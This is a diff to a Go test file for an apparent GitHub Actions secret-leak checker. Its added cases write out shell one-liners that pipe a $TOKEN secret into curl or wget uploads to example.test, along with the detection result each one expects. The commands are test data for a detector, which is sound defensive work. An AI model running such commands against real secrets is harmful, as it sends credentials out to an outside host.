@@ -106,7 +106,16 @@ func TestSecretLeakSinksAndFilters(t *testing.T) {
 		{"upload tracked file", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary @payload.txt https://example.test`, Network, 1},
 		{"upload tracked glob", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary @payload*.txt https://example.test`, Network, 1},
 		{"curl upload file option", `printf '%s' "$TOKEN" > payload.txt; curl -T payload.txt https://example.test`, Network, 1},
+		{"curl stdin upload option", `printf '%s' "$TOKEN" | curl -T - https://example.test`, Network, 1},
+		{"curl nonblocking stdin upload option", `printf '%s' "$TOKEN" | curl -T . https://example.test`, Network, 1},
+		{"curl long nonblocking stdin upload option", `printf '%s' "$TOKEN" | curl --upload-file . https://example.test`, Network, 1},
 		{"wget tracked post file", `printf '%s' "$TOKEN" > payload.txt; wget --post-file=payload.txt https://example.test`, Network, 1},
+		{"wget dot is not stdin", `printf '%s' "$TOKEN" | wget --post-file=. https://example.test`, "", 0},
+		{"wget separated dot is not stdin", `printf '%s' "$TOKEN" | wget --post-file . https://example.test`, "", 0},
+		{"wget dash is not stdin", `printf '%s' "$TOKEN" | wget --post-file=- https://example.test`, "", 0},
+		{"wget separated dash is not stdin", `printf '%s' "$TOKEN" | wget --post-file - https://example.test`, "", 0},
+		{"wget tracked dash file", `printf '%s' "$TOKEN" > ./-; wget --post-file=- https://example.test`, Network, 1},
+		{"wget separated tracked dash file", `printf '%s' "$TOKEN" > ./-; wget --post-file - https://example.test`, Network, 1},
 		{"read tracked glob", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary "$(cat *.txt)" https://example.test`, Network, 1},
 		{"summary preserves mask-looking content", `echo "::add-mask::$TOKEN" >> "$GITHUB_STEP_SUMMARY"`, Summary, 1},
 		{"discard", `echo "$TOKEN" > /dev/null`, "", 0},
@@ -125,7 +134,11 @@ func TestSecretLeakSinksAndFilters(t *testing.T) {
 				steps.WriteString("          " + line + "\n")
 			}
 			result := checkSteps(t, steps.String())
-			require.Empty(t, result.Gaps)
+			if tt.kind == Output {
+				require.NotEmpty(t, result.Gaps, "idless outputs retain a coverage gap")
+			} else {
+				require.Empty(t, result.Gaps)
+			}
 			require.Len(t, result.Findings, tt.count, "%+v", result.Findings)
 			if tt.count > 0 {
 				assert.Equal(t, tt.kind, result.Findings[0].Site.Kind)
@@ -264,7 +277,7 @@ jobs:
 	result, err := CheckSecretLeaks(workflow)
 	require.NoError(t, err)
 	require.Empty(t, result.Gaps)
-	require.Len(t, result.Findings, 6, "%+v", result.Findings)
+	require.Len(t, result.Findings, 5, "%+v", result.Findings)
 	for _, finding := range result.Findings {
 		assert.NotContains(t, finding.Site.Path, "unrelated")
 		assert.NotEqual(t, "jobs.producer.steps[3].run", finding.Site.Path)
@@ -367,7 +380,7 @@ func TestGroupedOutputsAndArtifactPaths(t *testing.T) {
           key: ${{ steps.emit.outputs.credential }}
           path: cache
 `)
-	require.Empty(t, result.Gaps)
+	require.NotEmpty(t, result.Gaps, "compound output records are tracked conservatively")
 	require.Len(t, result.Findings, 3)
 	assert.Equal(t, Output, result.Findings[0].Site.Kind)
 	assert.Equal(t, Artifact, result.Findings[1].Site.Kind)
